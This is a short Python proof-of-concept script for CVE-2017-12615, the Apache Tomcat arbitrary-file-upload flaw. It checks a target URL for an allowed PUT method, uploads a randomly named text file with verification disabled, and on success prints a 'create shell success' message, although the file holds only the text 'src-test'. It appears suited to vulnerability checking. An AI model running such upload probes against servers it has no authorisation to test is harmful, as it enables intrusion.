from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests
import sys
import random

body='''
src-test
'''
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
if len(sys.argv)<2:
    print ("python cve-2017-12615.py http://127.0.0.1:8080/")
    sys.exit()

url=sys.argv[1]
cafile = 'cacert.pem'
try:
	r=requests.options(url=url+'/123',verify=False,timeout=2)
	header=r.headers
	if 'PUT' in header['Allow']:
    		filename='/'+str(random.randint(666,666666))+'.txt'
    #print filename
    		r=requests.put(url=url+filename,data=body,verify=False,timeout=2)
    #print r.status_code
    		if r.status_code==201:
        		print ('create shell success: '+url+filename)
except Exception as e:
	with open('file.txt', mode='w') as file_object:
		file_object.write("1")
